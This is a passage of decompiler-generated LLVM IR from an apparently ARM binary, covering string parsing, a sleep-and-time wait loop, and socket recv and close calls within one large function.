  store i1 %v6_a3f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a3f0 = icmp eq i32 %v1_a3f0, 0
  store i1 %v7_a3f0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_a3f0, label %dec_label_pc_a618, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a404 = call i32 @function_13c04(i32 37, i32* null)
  %v0_a408 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a408, i32* @r1, align 4
  store i32 %v3_a404, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a414 = call i32 @function_14960(i8* %tmp199, i32 %v0_a408, i32 %v3_a404)
  store i32 %v4_a414, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_a420 = add i32 %v4_a414, %v2_94a0
  store i32 %v2_a420, i32* %r3.global-to-local, align 4
  %v1_a424 = load i32, i32* @r5, align 4
  %v2_a424 = add i32 %v1_a424, %v2_a420
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  %v4_a424 = load i8, i8* %v3_a424, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a42c = icmp ugt i8 %v4_a424, 31
  store i1 %v2_a42c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a42c = icmp ult i8 %v4_a424, 32
  store i1 %v6_a42c, i1* %cpsr_n.global-to-local, align 1
  %v7_a42c = icmp eq i8 %v4_a424, 32
  store i1 %v7_a42c, i1* %cpsr_z.global-to-local, align 1
  %v2_a434 = zext i1 %v7_a42c to i32
  %v2_a434.v4_a414 = add i32 %v2_a434, %v4_a414
  store i32 %v2_a434.v4_a414, i32* @r4, align 4
  %v2_a438 = add i32 %v2_a434.v4_a414, %v2_8fd8
  store i32 %v2_a438, i32* @r6, align 4
  store i32 %v2_a438, i32* %r0.global-to-local, align 4
  %v1_a440 = load i32, i32* %fp.global-to-local, align 4
  %v2_a440 = sub i32 %v1_a440, %v2_a434.v4_a414
  store i32 %v2_a440, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a44c = call i32 @function_146d0(i32 %v2_a438, i32 %v2_a440, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_a44c, i32* %r0.global-to-local, align 4
  %v1_a450 = add i32 %v5_a44c, 1
  %v2_a450 = icmp eq i32 %v5_a44c, -1
  store i1 %v2_a450, i1* %cpsr_c.global-to-local, align 1
  %v3_a450 = sub i32 0, %v5_a44c
  %v4_a450 = and i32 %v1_a450, %v3_a450
  %v5_a450 = icmp slt i32 %v4_a450, 0
  store i1 %v5_a450, i1* %cpsr_v.global-to-local, align 1
  %v6_a450 = icmp slt i32 %v1_a450, 0
  store i1 %v6_a450, i1* %cpsr_n.global-to-local, align 1
  %v7_a450 = icmp eq i32 %v1_a450, 0
  store i1 %v7_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a44c, i32* @r7, align 4
  br i1 %v7_a450, label %dec_label_pc_a618, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a3fc
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_a464 = load i32, i32* @r4, align 4
  %v2_a464 = add i32 %v1_a464, %v2_94a0
  %v1_a468 = add i32 %v5_a44c, -1
  %v2_a468 = icmp ne i32 %v5_a44c, 0
  store i1 %v2_a468, i1* %cpsr_c.global-to-local, align 1
  %v3_a468 = sub i32 0, %v5_a44c
  %v4_a468 = and i32 %v5_a44c, %v3_a468
  %v5_a468 = icmp slt i32 %v4_a468, 0
  store i1 %v5_a468, i1* %cpsr_v.global-to-local, align 1
  %v6_a468 = icmp slt i32 %v1_a468, 0
  store i1 %v6_a468, i1* %cpsr_n.global-to-local, align 1
  %v7_a468 = icmp eq i32 %v5_a44c, 1
  store i1 %v7_a468, i1* %cpsr_z.global-to-local, align 1
  %v1_a46c = add i32 %v2_a464, -20736
  store i32 %v1_a46c, i32* %r3.global-to-local, align 4
  %v7_a470 = icmp sgt i32 %v5_a44c, 1
  br i1 %v7_a470, label %bb231, label %bb232

bb231:                                            ; preds = %dec_label_pc_a45c
  %v9_a470 = add i32 %v5_a44c, -2
  store i32 %v9_a470, i32* @r7, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_a45c, %bb231
  %v3_a47c = phi i32 [ %v5_a44c, %dec_label_pc_a45c ], [ %v9_a470, %bb231 ]
  %v1_a474 = add i32 %v2_a464, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_a47c = add i32 %v1_a474, %v3_a47c
  %v5_a47c = inttoptr i32 %v4_a47c to i8*
  store i8 0, i8* %v5_a47c, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v1_a490 = load i32, i32* @r4, align 4
  %v2_a490 = add i32 %v1_a490, %v2_8fd8
  %v3_a490 = inttoptr i32 %v2_a490 to i8*
  %v4_a490 = load i8, i8* %v3_a490, align 1
  %v6_a490 = zext i8 %v4_a490 to i32
  store i32 %v6_a490, i32* %r0.global-to-local, align 4
  %v1_a494 = add nsw i32 %v6_a490, -48
  store i32 %v1_a494, i32* %r3.global-to-local, align 4
  %v2_a498 = icmp ugt i32 %v1_a494, 8
  store i1 %v2_a498, i1* %cpsr_c.global-to-local, align 1
  %v3_a498 = sub nsw i32 56, %v6_a490
  %v4_a498 = and i32 %v3_a498, %v1_a494
  %v5_a498 = icmp slt i32 %v4_a498, 0
  store i1 %v5_a498, i1* %cpsr_v.global-to-local, align 1
  %v6_a498 = icmp ult i8 %v4_a490, 57
  store i1 %v6_a498, i1* %cpsr_n.global-to-local, align 1
  %v7_a498 = icmp eq i32 %v1_a494, 9
  store i1 %v7_a498, i1* %cpsr_z.global-to-local, align 1
  %v2_a49c = xor i1 %v7_a498, true
  %v3_a49c = and i1 %v2_a498, %v2_a49c
  br i1 %v3_a49c, label %.thread142, label %dec_label_pc_a4a4

.thread142:                                       ; preds = %bb232
  %v4_a49c = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4cc

dec_label_pc_a4a4:                                ; preds = %bb232
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a4b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4a8

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a4a4
  %v0_a4a8 = phi i32 [ %v1_a4a8, %dec_label_pc_a4a8 ], [ 0, %dec_label_pc_a4a4 ]
  %v1_a4a8 = add i32 %v0_a4a8, 1
  store i32 %v1_a4a8, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 %v1_a4a8, i32* %stack_var_-40, align 4
  %v2_a4b4 = add i32 %v1_a4a8, %v1_a4b4.pre
  %v3_a4b4 = inttoptr i32 %v2_a4b4 to i8*
  %v4_a4b4 = load i8, i8* %v3_a4b4, align 1
  %v6_a4b4 = zext i8 %v4_a4b4 to i32
  store i32 %v6_a4b4, i32* %r0.global-to-local, align 4
  %v1_a4b8 = add nsw i32 %v6_a4b4, -48
  %v2_a4bc = icmp ugt i32 %v1_a4b8, 8
  store i1 %v2_a4bc, i1* %cpsr_c.global-to-local, align 1
  %v3_a4bc = sub nsw i32 56, %v6_a4b4
  %v4_a4bc = and i32 %v3_a4bc, %v1_a4b8
  %v5_a4bc = icmp slt i32 %v4_a4bc, 0
  store i1 %v5_a4bc, i1* %cpsr_v.global-to-local, align 1
  %v6_a4bc = icmp ult i8 %v4_a4b4, 57
  store i1 %v6_a4bc, i1* %cpsr_n.global-to-local, align 1
  %v7_a4bc = icmp eq i32 %v1_a4b8, 9
  store i1 %v7_a4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a4a8, i32* %r3.global-to-local, align 4
  %v2_a4c4 = xor i1 %v2_a4bc, true
  %v3_a4c4 = or i1 %v7_a4bc, %v2_a4c4
  br i1 %v3_a4c4, label %dec_label_pc_a4a8, label %dec_label_pc_a4cc

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4a8, %.thread142
  %v2_a4d8 = phi i32 [ %v4_a49c, %.thread142 ], [ %v2_a4b4, %dec_label_pc_a4a8 ]
  %v0_a4cc = phi i32 [ %v6_a490, %.thread142 ], [ %v6_a4b4, %dec_label_pc_a4a8 ]
  store i32 %v2_a4d8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a4cc = icmp eq i32 %v0_a4cc, 0
  store i1 %v2_a4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4cc, label %dec_label_pc_a618, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4cc
  store i32 0, i32* @r5, align 4
  %v3_a4d8 = inttoptr i32 %v2_a4d8 to i8*
  store i8 0, i8* %v3_a4d8, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a4e0 = load i32, i32* %stack_var_-40, align 4
  %v1_a4e4 = add i32 %v3_a4e0, 1
  store i32 %v1_a4e4, i32* %ip.global-to-local, align 4
  store i32 %v1_a4e4, i32* %stack_var_-40, align 4
  %v0_a4ec = load i32, i32* @r6, align 4
  %v2_a4ec = add i32 %v0_a4ec, %v1_a4e4
  %v3_a4ec = inttoptr i32 %v2_a4ec to i8*
  %v4_a4ec = load i8, i8* %v3_a4ec, align 1
  %v6_a4ec = zext i8 %v4_a4ec to i32
  store i32 %v6_a4ec, i32* %r3.global-to-local, align 4
  %v2_a4f0 = icmp ugt i8 %v4_a4ec, 31
  store i1 %v2_a4f0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a4f0 = icmp ult i8 %v4_a4ec, 32
  store i1 %v6_a4f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a4f0 = icmp eq i8 %v4_a4ec, 32
  store i1 %v7_a4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a4f0, label %bb233, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_a4d4
  store i32 %v2_a4ec, i32* @r4, align 4
  br label %bb234

bb233:                                            ; preds = %dec_label_pc_a4d4
  %v2_a4f4 = add i32 %v3_a4e0, 2
  store i32 %v2_a4f4, i32* %ip.global-to-local, align 4
  %v2_a4f8 = add i32 %v0_a4ec, %v2_a4f4
  store i32 %v2_a4f8, i32* @r4, align 4
  store i32 %v2_a4f4, i32* %stack_var_-40, align 4
  br label %bb234

bb234:                                            ; preds = %.thread56, %bb233
  %v0_a500 = phi i32 [ %v2_a4ec, %.thread56 ], [ %v2_a4f8, %bb233 ]
  store i32 %v0_a500, i32* %r0.global-to-local, align 4
  %v1_a504 = inttoptr i32 %v0_a500 to i8*
  %v2_a504 = call i32 @function_1460c(i8* %v1_a504)
  store i32 ptrtoint ([5 x i8]* @global_var_14f98.100 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a504, i32* @r1, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v4_a514 = inttoptr i32 %v0_a510 to i8*
  %v5_a514 = call i32 @function_14960(i8* %v4_a514, i32 %v2_a504, i32 ptrtoint ([5 x i8]* @global_var_14f98.100 to i32))
  store i32 %v5_a514, i32* %r0.global-to-local, align 4
  %v1_a518 = add i32 %v5_a514, 1
  %v2_a518 = icmp eq i32 %v5_a514, -1
  store i1 %v2_a518, i1* %cpsr_c.global-to-local, align 1
  %v3_a518 = sub i32 0, %v5_a514
  %v4_a518 = and i32 %v1_a518, %v3_a518
  %v5_a518 = icmp slt i32 %v4_a518, 0
  store i1 %v5_a518, i1* %cpsr_v.global-to-local, align 1
  %v6_a518 = icmp slt i32 %v1_a518, 0
  store i1 %v6_a518, i1* %cpsr_n.global-to-local, align 1
  %v7_a518 = icmp eq i32 %v1_a518, 0
  store i1 %v7_a518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a518, label %.thread60, label %dec_label_pc_a528

.thread60:                                        ; preds = %bb234
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v4_a520 = load i32, i32* %v11_904c, align 4
  store i32 %v4_a520, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a528:                                ; preds = %bb234
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_a52c = load i32, i32* %stack_var_-40, align 4
  %v0_a530 = load i32, i32* @r6, align 4
  %v2_a530 = add i32 %v0_a530, %v3_a52c
  store i32 %v2_a530, i32* @r4, align 4
  store i32 %v2_a530, i32* %r0.global-to-local, align 4
  %v1_a538 = inttoptr i32 %v2_a530 to i8*
  %v2_a538 = call i32 @function_1460c(i8* %v1_a538)
  store i32 ptrtoint ([5 x i8]* @global_var_14f98.100 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a538, i32* @r1, align 4
  %v0_a544 = load i32, i32* @r4, align 4
  store i32 %v0_a544, i32* %r0.global-to-local, align 4
  %v4_a548 = inttoptr i32 %v0_a544 to i8*
  %v5_a548 = call i32 @function_14960(i8* %v4_a548, i32 %v2_a538, i32 ptrtoint ([5 x i8]* @global_var_14f98.100 to i32))
  store i32 %v5_a548, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a550 = load i32, i32* %stack_var_-40, align 4
  %v2_a554 = add i32 %v3_a550, %v5_a548
  store i32 %v2_a554, i32* %ip.global-to-local, align 4
  store i32 %v2_a554, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a55c:                                ; preds = %.thread60, %dec_label_pc_a528
  %v0_aae4 = phi i32 [ %v4_a520, %.thread60 ], [ %v2_a554, %dec_label_pc_a528 ]
  %v0_a55c = load i32, i32* @r6, align 4
  %v2_a55c = add i32 %v0_a55c, %v0_aae4
  %v3_a55c = inttoptr i32 %v2_a55c to i8*
  %v4_a55c = load i8, i8* %v3_a55c, align 1
  %v6_a55c = zext i8 %v4_a55c to i32
  store i32 %v6_a55c, i32* %r3.global-to-local, align 4
  %v2_a560 = icmp ugt i8 %v4_a55c, 33
  store i1 %v2_a560, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a560 = icmp ult i8 %v4_a55c, 34
  store i1 %v6_a560, i1* %cpsr_n.global-to-local, align 1
  %v7_a560 = icmp eq i8 %v4_a55c, 34
  store i1 %v7_a560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a560, label %dec_label_pc_aae4, label %dec_label_pc_a568

dec_label_pc_a568:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_a55c, %dec_label_pc_ab0c
  %v0_a568 = load i32, i32* @r6, align 4
  store i32 %v0_a568, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a570 = inttoptr i32 %v0_a568 to i8*
  %v3_a570 = call i32 @function_14738(i8* %v2_a570, i32 10)
  store i32 %v3_a570, i32* %r0.global-to-local, align 4
  %v1_a574 = add i32 %v3_a570, -1
  store i32 %v1_a574, i32* %r3.global-to-local, align 4
  %v1_a578 = add i32 %v3_a570, -9
  %v2_a578 = icmp ugt i32 %v1_a574, 7
  store i1 %v2_a578, i1* %cpsr_c.global-to-local, align 1
  %v3_a578 = sub i32 8, %v3_a570
  %v4_a578 = and i32 %v3_a578, %v1_a574
  %v5_a578 = icmp slt i32 %v4_a578, 0
  store i1 %v5_a578, i1* %cpsr_v.global-to-local, align 1
  %v6_a578 = icmp slt i32 %v1_a578, 0
  store i1 %v6_a578, i1* %cpsr_n.global-to-local, align 1
  %v7_a578 = icmp eq i32 %v1_a574, 8
  store i1 %v7_a578, i1* %cpsr_z.global-to-local, align 1
  %v2_a57c = xor i1 %v2_a578, true
  %v3_a57c = or i1 %v7_a578, %v2_a57c
  br i1 %v3_a57c, label %dec_label_pc_a590.preheader, label %dec_label_pc_a5a4

dec_label_pc_a590.preheader:                      ; preds = %dec_label_pc_a568
  store i32 %v1_9530, i32* %ip.global-to-local, align 4
  %v6_a580 = add i32 %v3_a570, %v1_9530
  store i32 %v6_a580, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a590
  %v1_a58c = call i32 @_sleep(i32 1)
  store i32 %v1_a58c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a590:                                ; preds = %dec_label_pc_a590.preheader, %dec_label_pc_a58c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_a594 = call i32 @_time(i32 0)
  %v1_a598 = load i32, i32* %r4.global-to-local, align 4
  %v2_a598 = sub i32 %v1_a594, %v1_a598
  %v3_a598 = icmp uge i32 %v1_a594, %v1_a598
  store i1 %v3_a598, i1* %cpsr_c.global-to-local, align 1
  %v4_a598 = xor i32 %v1_a598, %v1_a594
  %v5_a598 = xor i32 %v2_a598, %v1_a594
  %v6_a598 = and i32 %v5_a598, %v4_a598
  %v7_a598 = icmp slt i32 %v6_a598, 0
  store i1 %v7_a598, i1* %cpsr_v.global-to-local, align 1
  %v8_a598 = icmp slt i32 %v2_a598, 0
  store i1 %v8_a598, i1* %cpsr_n.global-to-local, align 1
  %v9_a598 = icmp eq i32 %v1_a594, %v1_a598
  store i1 %v9_a598, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_a598, label %dec_label_pc_a5a4, label %dec_label_pc_a58c

dec_label_pc_a5a4:                                ; preds = %dec_label_pc_a590, %dec_label_pc_a568
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a5a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a5a8, i32* @r4, align 4
  %v0_a5ac = load i32, i32* @r6, align 4
  %v2_a5ac = add i32 %v0_a5ac, %v3_a5a8
  store i32 %v2_a5ac, i32* @r5, align 4
  store i32 %v2_a5ac, i32* %r0.global-to-local, align 4
  %v1_a5b4 = inttoptr i32 %v2_a5ac to i8*
  %v2_a5b4 = call i32 @function_1460c(i8* %v1_a5b4)
  store i32 ptrtoint ([5 x i8]* @global_var_14f90.98 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5b4, i32* @r1, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  store i32 %v0_a5c0, i32* %r0.global-to-local, align 4
  %v4_a5c4 = inttoptr i32 %v0_a5c0 to i8*
  %v5_a5c4 = call i32 @function_14960(i8* %v4_a5c4, i32 %v2_a5b4, i32 ptrtoint ([5 x i8]* @global_var_14f90.98 to i32))
  store i32 %v5_a5c4, i32* %r0.global-to-local, align 4
  %v1_a5c8 = add i32 %v5_a5c4, -4
  %v2_a5c8 = icmp ugt i32 %v5_a5c4, 3
  store i1 %v2_a5c8, i1* %cpsr_c.global-to-local, align 1
  %v3_a5c8 = sub i32 3, %v5_a5c4
  %v4_a5c8 = and i32 %v3_a5c8, %v5_a5c4
  %v5_a5c8 = icmp slt i32 %v4_a5c8, 0
  store i1 %v5_a5c8, i1* %cpsr_v.global-to-local, align 1
  %v6_a5c8 = icmp slt i32 %v1_a5c8, 0
  store i1 %v6_a5c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a5c8 = icmp eq i32 %v5_a5c4, 4
  store i1 %v7_a5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5c8, label %dec_label_pc_a9c0, label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5a4
  %v0_a5d0 = load i32, i32* @r6, align 4
  %v1_a5d0 = load i32, i32* @r4, align 4
  %v2_a5d0 = add i32 %v1_a5d0, %v0_a5d0
  %v3_a5d0 = inttoptr i32 %v2_a5d0 to i8*
  %v4_a5d0 = load i8, i8* %v3_a5d0, align 1
  %v6_a5d0 = zext i8 %v4_a5d0 to i32
  store i32 %v6_a5d0, i32* %r3.global-to-local, align 4
  %v2_a5d4 = icmp ugt i8 %v4_a5d0, 46
  store i1 %v2_a5d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a5d4 = icmp ult i8 %v4_a5d0, 47
  store i1 %v6_a5d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a5d4 = icmp eq i8 %v4_a5d0, 47
  store i1 %v7_a5d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5d4, label %dec_label_pc_ab38, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_ab54, %dec_label_pc_ab38, %dec_label_pc_aa90, %dec_label_pc_aa74, %dec_label_pc_a5d0, %dec_label_pc_ab84, %dec_label_pc_aac0
  %v0_a5dc = load i32, i32* %sb.global-to-local, align 4
  %v1_a5e0 = add i32 %v0_a5dc, 1431
  store i32 %v1_a5e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_a5ec = call i32 @_memcpy(i32 %v1_a5e0, i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32), i32 4)
  store i32 %v4_a5ec, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_a5f4 = load i32, i32* @r8, align 4
  %v3_a5f4 = add i32 %v2_a5f4, -1452
  %v4_a5f4 = inttoptr i32 %v3_a5f4 to i8*
  store i8 10, i8* %v4_a5f4, align 1
  br label %dec_label_pc_9590

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_9368
  store i32 %v1_9368, i32* %r3.global-to-local, align 4
  %v1_a600 = trunc i32 %v1_9368 to i8
  store i8 %v1_a600, i8* %v2_93a8, align 1
  %v0_a604 = load i32, i32* @r6, align 4
  %v1_a604 = add i32 %v0_a604, -1431
  %v2_a604 = inttoptr i32 %v1_a604 to i32*
  %v3_a604 = load i32, i32* %v2_a604, align 4
  store i32 %v3_a604, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @_close(i32 %v3_a604)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_a610 = load i32, i32* @r6, align 4
  %v2_a610 = add i32 %v1_a610, -1431
  %v3_a610 = inttoptr i32 %v2_a610 to i32*
  store i32 -1, i32* %v3_a610, align 4
  br label %dec_label_pc_9388

dec_label_pc_a618:                                ; preds = %dec_label_pc_a4cc, %dec_label_pc_a3fc, %dec_label_pc_a3d0
  %v0_a618 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_a628 = call i32 @function_146d0(i32 %v2_8fd8, i32 %v0_a618, i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), i32 4)
  %v0_a62c = load i32, i32* %sb.global-to-local, align 4
  %v1_a630 = add i32 %v0_a62c, 1431
  store i32 %v1_a630, i32* @r4, align 4
  store i32 %v5_a628, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14fa0.102 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a630, i32* %r0.global-to-local, align 4
  %v3_a640 = inttoptr i32 %v1_a630 to i8*
  %v4_a640 = call i32 @function_149ec(i8* %v3_a640, i32 ptrtoint ([5 x i8]* @global_var_14fa0.102 to i32))
  store i32 %v4_a640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a644 = icmp slt i32 %v4_a640, 0
  store i1 %v1_a644, i1* %cpsr_n.global-to-local, align 1
  %v2_a644 = icmp eq i32 %v4_a640, 0
  store i1 %v2_a644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a644, label %dec_label_pc_a800, label %dec_label_pc_a64c

dec_label_pc_a64c:                                ; preds = %dec_label_pc_a800, %dec_label_pc_a618
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, -1452
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 7, i8* %v4_a650, align 1
  br label %dec_label_pc_a654

dec_label_pc_a654:                                ; preds = %bb240, %dec_label_pc_a64c
  %v0_a654 = load i32, i32* @r5, align 4
  store i32 %v0_a654, i32* %r2.global-to-local, align 4
  %v0_a658 = load i32, i32* @r8, align 4
  %v1_a658 = add i32 %v0_a658, -1456
  %v2_a658 = inttoptr i32 %v1_a658 to i32*
  %v3_a658 = load i32, i32* %v2_a658, align 4
  store i32 %v3_a658, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a664 = call i32 @_recv(i32 %v3_a658, i32 %v2_8fd8, i32 %v0_a654, i32 16384)
  store i32 %v4_a664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9590

dec_label_pc_a66c:                                ; preds = %dec_label_pc_9b5c
  %v2_a66c = add i32 %v0_a66c, -10240
  %v3_a66c = icmp ugt i32 %v0_a66c, 10239
  store i1 %v3_a66c, i1* %cpsr_c.global-to-local, align 1
  %v4_a66c = sub i32 10239, %v0_a66c
  %v5_a66c = and i32 %v4_a66c, %v0_a66c
  %v6_a66c = icmp slt i32 %v5_a66c, 0
  store i1 %v6_a66c, i1* %cpsr_v.global-to-local, align 1
  %v7_a66c = icmp slt i32 %v2_a66c, 0
  store i1 %v7_a66c, i1* %cpsr_n.global-to-local, align 1
  %v8_a66c = icmp eq i32 %v0_a66c, 10240
  store i1 %v8_a66c, i1* %cpsr_z.global-to-local, align 1
  %v5_a670 = icmp slt i32 %v0_a66c, 10240
  br i1 %v5_a670, label %dec_label_pc_9590, label %dec_label_pc_9b78

dec_label_pc_a678:                                ; preds = %dec_label_pc_a380
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a67c = load i32, i32* @r4, align 4
  %v2_a67c = inttoptr i32 %v1_a67c to i32*
  store i32 104, i32* %v2_a67c, align 4
  br label %dec_label_pc_a3b4

dec_label_pc_a684:                                ; preds = %dec_label_pc_a188
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* %fp.global-to-local, align 4
  %v2_a688 = inttoptr i32 %v1_a688 to i32*
  store i32 104, i32* %v2_a688, align 4
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a6a8, %dec_label_pc_a684
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, -1456
  %v2_a68c = inttoptr i32 %v1_a68c to i32*
  %v3_a68c = load i32, i32* %v2_a68c, align 4
  store i32 %v3_a68c, i32* %r0.global-to-local, align 4
  %v1_a690 = call i32 @_close(i32 %v3_a68c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a69c = load i32, i32* @r8, align 4
  %v2_a69c = add i32 %v1_a69c, -1456
  %v3_a69c = inttoptr i32 %v2_a69c to i32*
  store i32 -1, i32* %v3_a69c, align 4
  %v0_a6a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_a6a0 = trunc i32 %v0_a6a0 to i8
  %v2_a6a0 = load i32, i32* @r8, align 4
  %v3_a6a0 = add i32 %v2_a6a0, -1452
  %v4_a6a0 = inttoptr i32 %v3_a6a0 to i8*
  store i8 %v1_a6a0, i8* %v4_a6a0, align 1
  br label %dec_label_pc_9590

dec_label_pc_a6a8:                                ; preds = %dec_label_pc_a1b0
  %v0_a6a8 = load i32, i32* %fp.global-to-local, align 4
  %v1_a6a8 = inttoptr i32 %v0_a6a8 to i32*
  %v2_a6a8 = load i32, i32* %v1_a6a8, align 4
  store i32 %v2_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = add i32 %v2_a6a8, -11
  %v2_a6ac = icmp ugt i32 %v2_a6a8, 10
  store i1 %v2_a6ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a6ac = sub i32 10, %v2_a6a8
  %v4_a6ac = and i32 %v3_a6ac, %v2_a6a8
  %v5_a6ac = icmp slt i32 %v4_a6ac, 0
  store i1 %v5_a6ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a6ac = icmp slt i32 %v1_a6ac, 0
  store i1 %v6_a6ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a6ac = icmp eq i32 %v2_a6a8, 11
  store i1 %v7_a6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6ac, label %dec_label_pc_9590, label %dec_label_pc_a68c

dec_label_pc_a6b8:                                ; preds = %bb230
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a6c4 = load i32, i32* @r5, align 4
  %v1_a6c4 = add i32 %v0_a6c4, 4
